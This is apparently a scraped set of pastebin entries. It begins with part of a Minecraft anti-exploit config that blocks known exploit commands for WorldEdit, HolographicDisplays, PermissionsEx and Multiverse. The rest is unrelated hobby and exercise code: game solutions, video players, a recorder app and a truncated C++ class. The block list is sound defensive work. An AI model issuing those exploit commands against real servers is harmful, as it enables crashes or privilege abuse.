          - ""minecraft:banlist""
          - ""minecraft:bossbar""
          - ""minecraft:clear""
          - ""minecraft:clone""
          - ""minecraft:data""
          - ""minecraft:datapack""
          - ""minecraft:debug""
          - ""minecraft:defaultgamemode""
          - ""minecraft:deop""
          - ""minecraft:difficulty""
          - ""minecraft:effect""
          - ""minecraft:enchant""
          - ""minecraft:execute""
          - ""minecraft:experience""
          - ""minecraft:fill""
          - ""minecraft:forceload""
          - ""minecraft:function""
          - ""minecraft:gamemode""
          - ""minecraft:give""
          - ""minecraft:help""
          - ""minecraft:kick""
          - ""minecraft:kill""
          - ""minecraft:list""
          - ""minecraft:loot""
          - ""minecraft:locate""
          - ""minecraft:locatebiome""
          - ""minecraft:message""
          - ""minecraft:me""
          - ""minecraft:op""
          - ""minecraft:pardon""
          - ""minecraft:pardon-ip""
          - ""minecraft:particle""
          - ""minecraft:playsound""
          - ""minecraft:recipe""
          - ""minecraft:reload""
          - ""minecraft:replaceitem""
          - ""minecraft:say""
          - ""minecraft:schedule""
          - ""minecraft:scoreboard""
          - ""minecraft:seed""
          - ""minecraft:setblock""
          - ""minecraft:setidletimeout""
          - ""minecraft:setworldspawn""
          - ""minecraft:spawnpoint""
          - ""minecraft:spectate""
          - ""minecraft:spreadplayers""
          - ""minecraft:stop""
          - ""minecraft:stopsound""
          - ""minecraft:summon""
          - ""minecraft:tag""
          - ""minecraft:team""
          - ""minecraft:teammsg""
          - ""minecraft:tell""
          - ""minecraft:tellraw""
          - ""minecraft:teleport""
          - ""minecraft:time""
          - ""minecraft:tp""
          - ""minecraft:trigger""
          - ""minecraft:weather""
          - ""minecraft:whitelist""
          - ""minecraft:worldborder""
          - ""minecraft:w""
          - ""minecraft:xp""
          - ""minecraft:title""
          - ""minecraft:tm""
        contains:
          - ""while""
          - ""targetoffset""
          - ""for(""
          - ""^(.""
          - ""*.""
          - ""@a""
          - ""@e""
          - ""@p""
          - ""@s""
          - ""@r""
  command:
    a:
      enabled: true
      punish: false
      max-vl: 3
      min-vl: 1
      punish-commands:
        - 'lpx kick %player% &cYou are sending suspicious packets.'
      options:
        commands: #CREDITS TO: https://github.com/2lstudios-mc/ExploitFixer
          # WorldEdit exploit
          - ""//calc""
          - ""//calculate""
          - ""//eval""
          - ""//evaluate""
          - ""//solve""
          # HolographicDisplays exploit
          - ""/hd readtext""
          - ""/holo readtext""
          - ""/hologram readtext""
          - ""/holograms readtext""
          - ""/holographicdisplays readtext""
          # PermissionsEx exploit
          - ""/pex promote""
          - ""/pex demote""
          - ""/promote""
          - ""/demote""
          - ""/execute""
          # Multiverse exploit
          - ""/mv ^""
          - ""/mv help ^""
          - ""/mvhelp ^""
          - ""/$""

# # 9663922631331687704501"
TLMHqXBZ,f3q3f2,amigo__,C++,Thursday 29th of February 2024 06:34:47 AM CDT,"#include <bits/stdc++.h>

using namespace std;

typedef long long ll;

ll findDayOfWeek(ll d1, ll m1, ll y1, ll t, ll d2, ll m2, ll y2, vector<ll> v, ll l, ll daysInYear, ll n) {
    if (y1 < y2) {
        // двигаем день недели в последний день месяца
        t = (t + v[m1 - 1] - d1) % (l);
        if (t == 0) t = l;

        // идем до последнего дня года прыгая по месяцам
        for (int i = 1; i <= n - m1; i++) {
            t = (t + v[m1 - 1 + i]) % (l);
            if (t == 0) t = l;
        }
        m1 = n;
        d1 = v[m1 - 1];

        // идем до последнего дня года y2-1 прыгая по годам
        for (ll y = y1 + 1; y < y2; y++) {
            t = (t + daysInYear) % (l);
            if (t == 0) t = l;
        }

        // прыгаем в году y2 по месяцам до месяца m2-1
        // потом встаем в последний день месяца m2-1
        for (int i = 1; i < m2; i++) {
            t = (t + v[i - 1]) % (l);
            if (t == 0) t = l;
        }

        // прыгаем в день d2
        t = (t + d2) % (l);
        if (t == 0) t = l;
    } else if (y1 == y2) {
        if (m1 != m2) {
            // двигаем день недели в последний день месяца
            t = (t + v[m1 - 1] - d1) % (l);
            if (t == 0) t = l;

            // прыгаем в году y2 по месяцам до месяца m2-1
            // потом встаем в последний день месяца m2-1
            for (ll i = m1 + 1; i < m2; i++) {
                t = (t + v[i - 1]) % (l);
                if (t == 0) t = l;
            }

            // прыгаем в день d2
            t = (t + d2) % (l);
            if (t == 0) t = l;
        } else {
            // прыгаем в день d2
            t = (t + d2 - d1) % (l + 1);
            if (t == 0) t++;
        }
    }

    return t;
}

int main() {
    ios_base::sync_with_stdio(false);
    cin.tie(0);

    ll n, l;
    cin >> n >> l;

    vector<ll> v(n);
    ll daysInYear = 0;
    for (int i = 0; i < n; i++) {
        cin >> v[i];
        daysInYear += v[i];
    }

    ll d1, m1, y1, t;
    cin >> d1 >> m1 >> y1 >> t;

    ll d2, m2, y2;
    cin >> d2 >> m2 >> y2;

    ll result = 0;
    int c = 0;
    if (y1 < y2) {
        c = 1;
    } else if (y1 > y2) {
        c = -1;
    } else {
        if (m1 < m2) {
            c = 1;
        } else if (m1 > m2) {
            c = -1;
        } else {
            if (d1 < d2) {
                c = 1;
            } else if (d1 > d2) {
                c = -1;
            } else {
                c = 0;
            }
        }
    }

    if (c == 1) {
        t = findDayOfWeek(d1, m1, y1, t, d2, m2, y2, v, l, daysInYear, n);
    } else if (c == -1) {
        ll t2 = findDayOfWeek(d2, m2, y2, 1, d1, m1, y1, v, l, daysInYear, n);
        if (t2 == t) {
            t = 1;
        } else if (t2 < t) {
            t = 1 + (t - t2);
        } else {
            t = l - (t2 - t - 1);
        }
    }

    cout << t;

    return 0;
}
"
RnPqqxAi,Untitled,phatboislym,Python,Thursday 29th of February 2024 06:21:18 AM CDT,"# Definition for a binary tree node.
# class TreeNode:
#     def __init__(self, val=0, left=None, right=None):
#         self.val = val
#         self.left = left
#         self.right = right

def traverse(root) -> list[list[int]]:
    nodes: list[list[int]] = []

    def helper(node: Optional[TreeNode], level: int):
        if node:
            if nodes.__len__() == level:
                nodes.append([])

        if node.left:
            nodes[level].append(node.left.val)
            helper(node.left, level + 1)
        
        if node.right:
            nodes[level].append(node.right.val)
            helper(node.right, level + 1)

    helper(root, 0); 

    return nodes


class Solution:
    def isEvenOddTree(self, root: Optional[TreeNode]) -> bool:
        nodes: list[list[int]] = [] 

        if root: 
            nodes = [[root.val]] + traverse(root)
            nodes.pop()
        else:
            return False

        for i in range(nodes.__len__()):
            level: list[int] = nodes[i]

            if i % 2: 
                if level[0] % 2:
                    return False 
                for j in range(level.__len__() - 1):
                    if level[j] <= level[j + 1] or level[j] % 2 or level[j + 1] % 2: 
                        return False
            else:
                if level[0] % 2 == 0:
                    return False 
                for j in range(level.__len__() - 1):
                    if level[j] >= level[j + 1] or level[j] % 2 == 0 or level[j + 1] % 2 == 0:
                        return False
        return True    "
AwggPQQ0,YOUTUBE-PLAYER.py,Najeebsk,Python,Thursday 29th of February 2024 06:20:57 AM CDT,"import tkinter as tk
import vlc
from pytube import YouTube
from threading import Thread

class VideoPlayer:
    def __init__(self, root):
        self.root = root
        self.instance = vlc.Instance('--no-xlib')  # Add this line for Windows support
        self.player = self.instance.media_player_new()

        self.frame = tk.Frame(root)
        self.frame.pack(side=""left"", fill=""both"", expand=True)

         # Title Label
        self.title_label = tk.Label(self.frame, text=""Najeeb's YouTube Player"", font=(""Helvetica"", 16, ""bold""))
        self.title_label.pack()


        self.player_frame = tk.Frame(root, width=800, height=600)  # Video frame size
        self.player_frame.pack(side=""right"", fill=""both"", expand=True)

        self.status_label = tk.Label(self.frame, text="""", fg=""green"")
        self.status_label.pack()

        self.control_frame = tk.Frame(self.frame)
        self.control_frame.pack(side=""bottom"", fill=""x"")

        self.play_button = tk.Button(self.control_frame, text=""Play"", command=self.play_video)
        self.play_button.pack(side=""left"", padx=5)

        self.stop_button = tk.Button(self.control_frame, text=""Stop"", command=self.stop_video)
        self.stop_button.pack(side=""left"", padx=5)

        self.fullscreen_button = tk.Button(self.control_frame, text=""Full Screen"", command=self.toggle_fullscreen)
        self.fullscreen_button.pack(side=""left"", padx=5)

        self.time_slider = tk.Scale(self.control_frame, from_=0, to=100, orient=""horizontal"", command=self.set_video_position)
        self.time_slider.pack(side=""left"", fill=""x"", expand=True)

        self.lst = tk.Listbox(self.frame, width=15, height=20)
        self.lst.pack(side=""bottom"", fill=""both"", expand=True)

        self.scrollbar = tk.Scrollbar(self.lst, orient=""vertical"")
        self.scrollbar.config(command=self.lst.yview)
        self.scrollbar.pack(side=""right"", fill=""y"")

        self.lst.config(yscrollcommand=self.scrollbar.set)

        self.lst.bind(""<<ListboxSelect>>"", self.play_selected_video)
        self.read_youtube_list()

        self.player.event_manager().event_attach(vlc.EventType.MediaPlayerTimeChanged, self.update_time_slider)

    def read_youtube_list(self):
        try:
            with open(""YOUTUBE-LIST.txt"", ""r"") as file:
                urls = file.readlines()
                for url in urls:
                    parts = url.strip().split(""="")
                    if len(parts) >= 2:  
                        name = parts[0]
                        self.lst.insert(tk.END, name)
        except FileNotFoundError:
            self.status_label.config(text=""YOUTUBE-LIST.txt not found"", fg=""red"")

    def play_selected_video(self, event):
        selection = self.lst.curselection()
        if selection:
            name = self.lst.get(selection[0])
            self.play_youtube_video(name)

    def play_video(self):
        self.player.play()
        self.status_label.config(text=""Playing"", fg=""green"")

    def stop_video(self):
        self.player.stop()
        self.status_label.config(text=""Stopped"", fg=""red"")

    def set_video_position(self, value):
        self.player.set_position(float(value) / 100)

    def update_time_slider(self, event):
        position = self.player.get_position()
        self.time_slider.set(int(position * 100))

    def play_youtube_video(self, name):
        self.status_label.config(text=""Loading..."")
        self.root.update()
        video_thread = Thread(target=self.play_youtube_video_thread, args=(name,))
        video_thread.start()

    def play_youtube_video_thread(self, name):
        try:
            with open(""YOUTUBE-LIST.txt"", ""r"") as file:
                urls = file.readlines()
                for url in urls:
                    parts = url.strip().split(""="")
                    if len(parts) >= 2 and parts[0] == name:
                        link = ""="".join(parts[1:])  
                        video = YouTube(link)
                        video_stream = video.streams.filter(res=""360p"").first()
                        media = self.instance.media_new(video_stream.url)
                        self.player.set_media(media)

                        if self.player_frame.winfo_children():
                            self.player_frame.winfo_children()[0].destroy()

                        self.player_frame.update()
                        self.player.set_hwnd(self.player_frame.winfo_id())
                        self.player.play()

                        self.status_label.config(text=""Playing"", fg=""green"")
                        return

            self.status_label.config(text=""Video not found"", fg=""red"")

        except Exception as e:
            self.status_label.config(text=""Failed to play"", fg=""red"")

    def toggle_fullscreen(self):
        if self.root.attributes('-fullscreen'):
            self.root.attributes('-fullscreen', False)
            self.fullscreen_button.config(text=""Full Screen"")
        else:
            self.root.attributes('-fullscreen', True)
            self.fullscreen_button.config(text=""Exit Full Screen"")

root = tk.Tk()
root.title(""NAJEEB YOUTUBE PLAYER"")
root.geometry(""800x600+300+50"")
video_player = VideoPlayer(root)
root.mainloop()
"
kYTUfnKg,snake,nirajs,Python,Thursday 29th of February 2024 06:18:51 AM CDT,"
from collections import deque
from enum import Enum
from abc import ABC, abstractmethod

class Direction(Enum):
    LEFT = ""L""
    RIGHT = ""R""
    UP = 'U'
    DOWN = 'D'


class SnakeGameInterface(ABC):
    @abstractmethod
    def move(self, dir: str) -> int:
        pass

class SnakeGame(SnakeGameInterface):

    def __init__(self, width: int, height: int, foodList: list[list[int]]):
        self.row = width
        self.col = height
        self.foodList = deque(foodList)
        self.snakePath = deque([(0,0)])
        self.score = 0
        self.direction = {
            Direction.LEFT: (-1,0),
            Direction.RIGHT: (0,1),
            Direction.UP: (0,-1),
            Direction.DOWN: (0,1)
        }

    def move(self, dir: str) -> int:
        try:
            dx, dy = self.direction[Direction(dir)]
        except:
            raise ""Invalid Direction""
        head_x, head_y = self.snakePath[0]
        head = (dx + head_x, dy + head_y)

        if (self.collision(head) == True):
            return -1

        if (self.foodList) and list(head) == self.foodList[0]:
            self.score += 1
            self.foodList.popleft()
        else:
            self.snakePath.pop()

        self.snakePath.appendleft(head)
        return self.score

    def collision(self, head) -> bool:
        if (head[0] < 0 or head[0] >= self.row or head[1] < 0 or head[1] >= self.col):
            return True

        return False


width , height = 3,3,
foodList = [[0,1], [0,2]]
snake = SnakeGame(3,3, foodList)
print(snake.move(""R""))


"
t5MHgYU1,VLC-PLAYER.py,Najeebsk,Python,Thursday 29th of February 2024 06:18:11 AM CDT,"import tkinter as tk
import vlc

class VideoPlayer:
    def __init__(self, root):
        self.root = root
        self.instance = vlc.Instance('--no-xlib')  
        self.player = self.instance.media_player_new()
        self.player.set_fullscreen(True)

        self.main_frame = tk.Frame(root)
        self.main_frame.pack(fill=""both"", expand=True)

        # Add big title label with custom font and color
        self.title_label = tk.Label(self.main_frame, text=""NAJEEB VIDEO PLAYER"", font=(""Arial"", 24, ""bold""), fg=""blue"")
        self.title_label.pack(pady=10)

        self.list_frame = tk.Frame(self.main_frame)
        self.list_frame.pack(side=""left"", fill=""both"", expand=False)

        self.button_frame = tk.Frame(self.main_frame)
        self.button_frame.pack(side=""bottom"", fill=""x"")

        self.lst = tk.Listbox(self.list_frame, width=30, height=20)
        self.lst.pack(side=""left"", fill=""both"", expand=True)

        self.scrollbar = tk.Scrollbar(self.list_frame, orient=""vertical"")
        self.scrollbar.config(command=self.lst.yview)
        self.scrollbar.pack(side=""right"", fill=""y"")

        self.lst.config(yscrollcommand=self.scrollbar.set)

        self.play_button = tk.Button(self.button_frame, text=""Play"", command=self.play_video)
        self.play_button.pack(side=""left"", padx=5, pady=5)

        self.stop_button = tk.Button(self.button_frame, text=""Stop"", command=self.stop_video)
        self.stop_button.pack(side=""left"", padx=5, pady=5)

        self.prev_button = tk.Button(self.button_frame, text=""Prev"", command=self.prev_video)
        self.prev_button.pack(side=""left"", padx=5, pady=5)

        self.next_button = tk.Button(self.button_frame, text=""Next"", command=self.next_video)
        self.next_button.pack(side=""left"", padx=5, pady=5)

        self.player_position = tk.Scale(self.button_frame, from_=0, to=100, orient=""horizontal"", command=self.set_position, length=400)  # Adjust the length as needed
        self.player_position.pack(side=""left"", fill=""x"", padx=5, pady=5)

        self.current_video_label = tk.Label(root, text=""No video selected"")
        self.current_video_label.pack(pady=5)

        self.player_frame = tk.Frame(self.main_frame)
        self.player_frame.pack(side=""right"", fill=""both"", expand=True)

        self.lst.bind(""<<ListboxSelect>>"", self.show_video)

        self.insert_files()

    def insert_files(self):
        try:
            with open('VIDEOS.txt', 'r') as file:
                self.video_list = []
                for line in file:
                    line = line.strip()
                    if line.startswith(""Title:""):
                        title = line.split("": "")[1]
                        self.lst.insert(tk.END, title)
                        self.video_list.append(title)
                    elif line:
                        setattr(self, title, line)  # Store filepath as an attribute
        except FileNotFoundError:
            print(""VIDEOS.txt not found."")

    def play_video(self):
        if self.player.get_state() == vlc.State.Ended:
            self.player.stop()
        self.player.play()
        self.current_video_label.config(text=""Video playing"")

    def show_video(self, event):
        n = self.lst.curselection()
        if n:
            title = self.lst.get(n[0])
            filepath = getattr(self, title, None)
            if filepath:
                media = self.instance.media_new(filepath)
                self.player.set_media(media)

                if self.player_frame.winfo_children():
                    self.player_frame.winfo_children()[0].destroy()

                self.player_frame.update()
                self.player.set_hwnd(self.player_frame.winfo_id())
                self.play_video()  # Automatically play the video when selected
                self.current_video_label.config(text=""Current video: "" + title)

    def stop_video(self):
        self.player.stop()
        self.current_video_label.config(text=""Video stopped"")

    def prev_video(self):
        current_index = self.video_list.index(self.lst.get(tk.ACTIVE))
        prev_index = current_index - 1 if current_index > 0 else len(self.video_list) - 1
        self.lst.selection_clear(0, tk.END)
        self.lst.selection_set(prev_index)
        self.lst.activate(prev_index)
        self.show_video(None)

    def next_video(self):
        current_index = self.video_list.index(self.lst.get(tk.ACTIVE))
        next_index = (current_index + 1) % len(self.video_list)
        self.lst.selection_clear(0, tk.END)
        self.lst.selection_set(next_index)
        self.lst.activate(next_index)
        self.show_video(None)

    def set_position(self, value):
        self.player.set_position(float(value) / 100)

root = tk.Tk()
root.geometry(""800x600+300+50"")
#root.config(bg='green')
root.title(""Najeeb VLC Player"")
video_player = VideoPlayer(root)
root.mainloop()
"
Z926JGi1,Untitled,DVS_studio,Dart,Thursday 29th of February 2024 06:17:54 AM CDT,"import 'dart:async';
import 'dart:html';
import 'dart:typed_data';

import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:just_audio/just_audio.dart';

class _Recorder {
  MediaRecorder? _mediaRecorder;
  List<Blob>? _audioBlobParts;
  String? _recordingUrl;

  Future<void> init() async {
    assert(_mediaRecorder == null);

    final stream =
        await window.navigator.mediaDevices?.getUserMedia({'audio': true});
    if (stream == null) return;
    _mediaRecorder = MediaRecorder(stream);

    _audioBlobParts = [];
    _mediaRecorder!.addEventListener('dataavailable', _onDataAvailable);
  }

  void _onDataAvailable(Event event) {
    final blobEvent = event as BlobEvent;
    _audioBlobParts!.add(blobEvent.data!);
  }

  Future<void> start() async {
    assert(_mediaRecorder != null);

    _mediaRecorder!.start();
  }

  /// Stops the recorder and returns an URL pointing to the recording.
  Future<String> stop() async {
    assert(_mediaRecorder != null);
    assert(_recordingUrl == null);

    final completer = Completer<String>();

    void onStop(_) {
      assert(_audioBlobParts != null);

      final blob = Blob(_audioBlobParts!);
      _audioBlobParts = null;

      completer.complete(Url.createObjectUrl(blob));
    }

    _mediaRecorder!.addEventListener('stop', onStop);
    _mediaRecorder!.stop();
    _recordingUrl = await completer.future;
    _mediaRecorder!.removeEventListener('stop', onStop);

    return _recordingUrl!;
  }

  Future<Uint8List> toBytes() async {
    assert(_recordingUrl != null);

    final result = await http.get(Uri.parse(_recordingUrl!));
    return result.bodyBytes;
  }

  void dispose() {
    assert(_mediaRecorder != null);

    _mediaRecorder!.removeEventListener('dataavailable', _onDataAvailable);
    _mediaRecorder = null;
  }
}

void main() {
  runApp(const MicrophoneExampleApp());
}

class MicrophoneExampleApp extends StatefulWidget {
  /// Constructs [MicrophoneExampleApp].
  const MicrophoneExampleApp({super.key});

  @override
  State<MicrophoneExampleApp> createState() => _MicrophoneExampleAppState();
}

class _MicrophoneExampleAppState extends State<MicrophoneExampleApp> {
  _Recorder? _recorder;
  AudioPlayer? _audioPlayer;

  @override
  void dispose() {
    _recorder?.dispose();
    _audioPlayer?.dispose();
    super.dispose();
  }

  Future<void> _initRecorder() async {
    _recorder?.dispose();
    await window.navigator.permissions?.query({'name': 'microphone'});
    _recorder = _Recorder();
    await _recorder!.init();
  }

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      home: Scaffold(
        body: Center(
          child: Column(
            children: [
              OutlinedButton(
                onPressed: _initRecorder,
                child: const Text('Restart recorder'),
              ),
              OutlinedButton(
                onPressed: () {
                  _recorder?.start();
                },
                child: const Text('Start recording'),
              ),
              OutlinedButton(
                onPressed: () async {
                  await _recorder?.stop();
                },
                child: const Text('Stop recording'),
              ),
              OutlinedButton(
                onPressed: () async {
                  final bytes = await _recorder?.toBytes();
                  print(bytes);
                },
                child: const Text('To Butes'),
              ),
              OutlinedButton(
                onPressed: () async {
                  _audioPlayer?.dispose();
                  _audioPlayer = AudioPlayer();
                  await _audioPlayer!.setUrl(_recorder!._recordingUrl!);
                  await _audioPlayer!.play();
                },
                child: const Text('Play recording'),
              ),
            ],
          ),
        ),
      ),
    );
  }
}
"
qPdiQ3mt,SEARCH-FILES-LIST-TITAL.py,Najeebsk,Python,Thursday 29th of February 2024 06:16:44 AM CDT,"import tkinter as tk
from tkinter import filedialog
import glob
import os

def search_files(extension):
    folder_path = filedialog.askdirectory()
    if folder_path:
        file_list = glob.glob(folder_path + f""/*.{extension}"")
        with open(f""file_list_{extension}.txt"", ""w"") as file:
            for filepath in file_list:
                filename = os.path.basename(filepath)
                file.write(f""Title: {os.path.splitext(filename)[0]}\n{filepath}\n"")
        result_label.config(text=""File list saved successfully!"")

# GUI
root = tk.Tk()
root.title(""Najeeb File Search"")
root.geometry('300x100')


extension_label = tk.Label(root, text=""Enter File Extension Only"")
extension_label.pack()

extension_entry = tk.Entry(root)
extension_entry.pack()

search_button = tk.Button(root, text=""Search"", command=lambda: search_files(extension_entry.get()))
search_button.pack()

result_label = tk.Label(root, text="""")
result_label.pack()

root.mainloop()
"
jyTzX1jN,ROCK PAPER SCISSOR,SenpaiZero,Java,Thursday 29th of February 2024 06:12:28 AM CDT,"import java.util.Random;
import java.util.Scanner;

public class rock_paper_scissor 
{
	private int winsToWinTheMatch;
	public rock_paper_scissor(int winsToWinTheMatch) 
	{
		this.winsToWinTheMatch = winsToWinTheMatch;
	}
	public void start()
	{
		System.out.println(""WELCOME TO ROCK, PAPER AND SCISSOR!"");
		gameplay();
	}
	
	private void gameplay()
	{
		int score = 0, enemyScore = 0, enemyChoice, userChoice;
		Random random = new Random();
		Scanner scanner = new Scanner(System.in);
		
		do
		{
			enemyChoice = random.nextInt(1, 4);
			System.out.println(""Please Choose \n[1] ROCK\n[2] Paper\n[3] SCISSOR\n"");
			System.out.print(""Enter: "");
			String choice = scanner.nextLine();
			String winner = checkWinner(getWeapon(Integer.valueOf(choice)), getWeapon(Integer.valueOf(enemyChoice)));
			if(winner.equals(""PLAYER""))
			{
				System.out.println(""Player is the winner"");
				score++;
			}
			else if(winner.equals(""ENEMY""))
			{
				System.out.println(""Enemy is the winner"");
				enemyScore++;
			}
			else {
				System.out.println(""TIE"");
			}
			
			System.out.println(""\nCURENT SCORE "");
			System.out.println(""Player: "" + score);
			System.out.println(""Enemy: "" + enemyScore);
			System.out.println(""==========================================\n"");
			
			if(winsToWinTheMatch <= score)
			{
				System.out.println(""PLAYER IS THE WINNER OF THE MATCH"");
				break;
			}
			else if(winsToWinTheMatch <= enemyScore)
			{
				System.out.println(""ENEMY IS THE WINNER OF THE MATCH"");
				break;
			}
		} while(true);
	}
	
	private String getWeapon(int weapon)
	{
		if(weapon == 1)
			return ""ROCK"";
		else if(weapon == 2)
			return ""PAPER"";
		else if(weapon == 3)
			return ""SCISSOR"";
		else
			return ""ERROR"";
	}
	private String checkWinner(String playerChoice, String enemyChoice)
	{
		if(playerChoice.equalsIgnoreCase(enemyChoice))
			return ""TIE"";
		else if(playerChoice.equals(""ROCK"") && enemyChoice.equals(""PAPER""))
			return ""ENEMY"";
		else if(playerChoice.equals(""SCISSOR"") && enemyChoice.equals(""ROCK""))
			return ""ENEMY"";
		else if(playerChoice.equals(""PAPER"") && enemyChoice.equals(""SCISSOR""))
			return ""ENEMY"";
		else
			return ""PLAYER"";
	}
}
"
rYdBcYmb,Hangman,SenpaiZero,Java,Thursday 29th of February 2024 06:11:39 AM CDT,"import java.util.Random;
import java.util.Scanner;

public class hangman {
	private int lives;
	private String[] wordsArr;
	private String wordToGuess;
	private String wordToGuess_blanks;
	
	public hangman(int lives, String[] wordsArr)
	{
		this.lives = lives;
		this.wordsArr = wordsArr;
	}
	
	public void play()
	{
		System.out.println(""WELCOME TO HANGMAN!"");
		wordToGuess = randWordGuess().toUpperCase();
		initializeBlanks();
		gameplay();
	}
	
	private void initializeBlanks() 
	{
	    int mid = wordToGuess.length() / 2;
	    StringBuilder blanksBuilder = new StringBuilder(wordToGuess);

	    for (int i = 0; i < mid; i++) 
	    {
	        blanksBuilder.setCharAt(i, '_');
	    }

	    wordToGuess_blanks = blanksBuilder.toString();
	}

	private void updateBlanks(char guess) 
	{
        StringBuilder updatedBlanks = new StringBuilder(wordToGuess_blanks);
        for (int i = 0; i < wordToGuess.length(); i++) {
            if (wordToGuess.charAt(i) == guess) 
                updatedBlanks.setCharAt(i, guess);
        }
        wordToGuess_blanks = updatedBlanks.toString();
    }
	private void gameplay()
	{
		Scanner scanner = new Scanner(System.in);

        do {
            System.out.println(""\nWord to guess: "" + wordToGuess_blanks);
            System.out.print(""Enter a letter: "");
            char guess = scanner.next().toUpperCase().charAt(0);

            if (wordToGuess.contains(String.valueOf(guess))) 
            {
                updateBlanks(guess);
            } 
            else 
            {
                lives--;
                System.out.print(""Incorrect guess! Lives remaining: "" + lives);
                for (int i = 0; i < lives; i++) 
                {
					System.out.print("" ❤"");
				}
                System.out.println();
            }
        } while (!checkDead() && !wordToGuess_blanks.equals(wordToGuess));

        if (wordToGuess_blanks.equals(wordToGuess)) 
            System.out.println(""\nCongratulations! You guessed the word: "" + wordToGuess);
         else 
            System.out.println(""\nOut of lives! The word was: "" + wordToGuess);
	}
	
	private boolean checkDead()
	{
		return lives <= 0;
	}
	
	private String randWordGuess()
	{
		Random random = new Random();
		return wordsArr[random.nextInt(0, wordsArr.length)];
	}
}
"
6aceidDb,data855,TestGuy1,JSON,Thursday 29th of February 2024 06:00:08 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '2e363c172d18c91bd1f3f499baa59a0516879b47c98ce91245f9828cc570b5e41d540961ac4c1c1be6b623b53d61e325b64d1663dccf9b8b5027d71e365c165288e1098a62f9b8e78b078585a6829ff5f3573f8a5891e518862c292827a0e7d1512a74d6488f2390b259c62a66ed9dd4b459a1f0b5b0c3e9e5d5f486c7abcdbd',
  otherdata: [
    'bcadb802a68d1a05a4501a6ed114cb73',
    '85c04bd8c5b006ff56859f71b83a4587',
    'c1068a616986b26bd77e8dd98bc040f0',
    'a0509b4c21e6232695872125c9007b4a',
    'ea594e100a8fbcfdcc0416ae06818d20',
    '49fcc95232d442d08087672a8abe309c',
    '4d89dc34c853e41e973a71adb39c07d7',
    'ddb0da1ffa222c4e0b9fb434f38a25c7'
  ]
}"
KzE5iENY,efwef,amigo__,C++,Thursday 29th of February 2024 05:28:10 AM CDT,"#include <bits/stdc++.h>

using namespace std;

typedef unsigned long long ul;

int main() {
    ios_base::sync_with_stdio(false);
    cin.tie(0);

    int n;
    cin >> n;
    unordered_map<int, int> xLeft;
    unordered_map<int, int> xRight;
    unordered_map<int, int> yLeft;
    unordered_map<int, int> yRight;
    unordered_map<int, int> col;
    unordered_map<int, int> row;
    unordered_map<ul, int> board;

    while (n--) {
        int x, y;
        cin >> x >> y;
        int xReverse = 100000000 - x;

        col[x] = (col[x] ?: 0) + 1;
        row[y] = (row[y] ?: 0) + 1;
        ul coords = y * ul(1e9) + x;
        board[coords] = (board[coords] ?: 0) + 1;

        if (y > x) {
            yRight[y - x] = (yRight[y - x] ?: 0) + 1;
        } else {
            xRight[x - y] = (xRight[x - y] ?: 0) + 1;
        }

        if (y > xReverse) {
            yLeft[y - xReverse] = (yLeft[y - xReverse] ?: 0) + 1;
        } else {
            xLeft[xReverse - y] = (xLeft[xReverse - y] ?: 0) + 1;
        }
    }

    int q;
    cin >> q;
    while (q--) {
        char type;
        int x, y;
        int count = 0;
        cin >> type;
        cin >> x >> y;

        if (type == 'K') {
            ul coords = (y + 1) * ul(1e9) + (x - 2);
            count = board[coords] ?: 0;

            coords = (y - 1) * ul(1e9) + (x - 2);
            count += board[coords] ?: 0;

            coords = (y + 1) * ul(1e9) + (x + 2);
            count += board[coords] ?: 0;

            coords = (y - 1) * ul(1e9) + (x + 2);
            count += board[coords] ?: 0;

            coords = (y + 2) * ul(1e9) + (x + 1);
            count += board[coords] ?: 0;

            coords = (y + 2) * ul(1e9) + (x - 1);
            count += board[coords] ?: 0;

            coords = (y - 2) * ul(1e9) + (x + 1);
            count += board[coords] ?: 0;

            coords = (y - 2) * ul(1e9) + (x - 1);
            count += board[coords] ?: 0;
        }

        if (type == 'P') {
            ul coords = (y + 1) * ul(1e9) + (x - 1);
            count = board[coords] ?: 0;

            coords = (y + 1) * ul(1e9) + (x + 1);
            count += board[coords] ?: 0;
        }

        if (type == 'B') {
            int xReverse = 100000000 - x;
            if (y > x) {
                count += yRight[y - x] ?: 0;
            } else {
                count += xRight[x - y] ?: 0;
            }
            if (y > xReverse) {
                count += yLeft[y - xReverse] ?: 0;
            } else {
                count += xLeft[xReverse - y] ?: 0;
            }
        }

        if (type == 'R') {
            count = col[x] ?: 0;
            count += row[y] ?: 0;
        }

        if (type == 'Q') {
            int xReverse = 100000000 - x;
            count = col[x] ?: 0;
            count += row[y] ?: 0;
            if (y > x) {
                count += yRight[y - x] ?: 0;
            } else {
                count += xRight[x - y] ?: 0;
            }
            if (y > xReverse) {
                count += yLeft[y - xReverse] ?: 0;
            } else {
                count += xLeft[xReverse - y] ?: 0;
            }
        }
        cout << count << ""\n"";
    }

    return 0;
}
"
GfKvyC3Y,Untitled,Pijomir,JavaScript,Thursday 29th of February 2024 05:12:18 AM CDT,"const departButtonElement = document.getElementById('depart');
const arriveButtonElement = document.getElementById('arrive');
const infoElement = document.querySelector('#info span');

function solve() {
    let busStopName = '';
    let busStopId = 'depot'
    const url = 'http://localhost:3030/jsonstore/bus/schedule';
    async function depart() {
        try {
            const response = await fetch(`${url}/${busStopId}`);
            if (!response.ok) {
                const errorMessage = await response.json();
                throw errorMessage;
            }

            const data = await response.json();
            busStopId = data.next;
            busStopName = data.name;
            infoElement.textContent = `Next stop ${busStopName}`;
            departButtonElement.disabled = true;
            arriveButtonElement.disabled = false;
        } catch {
            infoElement.textContent = 'Error';
            departButtonElement.disabled = true;
            arriveButtonElement.disabled = true;
        }
    }

    async function arrive() {
        infoElement.textContent = `Arriving at ${busStopName}`;
        departButtonElement.disabled = false;
        arriveButtonElement.disabled = true;
    }

    return {
        depart,
        arrive
    };
}

let result = solve();"
KZHnH0c0,Untitled,35657,C++,Thursday 29th of February 2024 05:05:24 AM CDT,"#include <iostream>


using namespace std;

class Vector {

public:
	Vector() : size_(0), capacity_(4), arr_(new int[4]) {}

	explicit Vector(const int capacity) : size_(0), capacity_(capacity), arr_(new int[capacity_]) {}

	Vector(const Vector& other) : size_(other.size_), capacity_(other.capacity_), arr_(new int[capacity_]){
		for (int i = 0; i < size_; i++) {
			arr_[i] = other.arr_[i];
		}
		total_number_elements += size_;
	}

	Vector& operator=(const Vector& other) {
		if (&other != this) {
			total_number_elements += other.size_ - size_;
			delete[] arr_;
			size_ = other.size_;
			capacity_ = other.capacity_;
			arr_ = new int[capacity_];
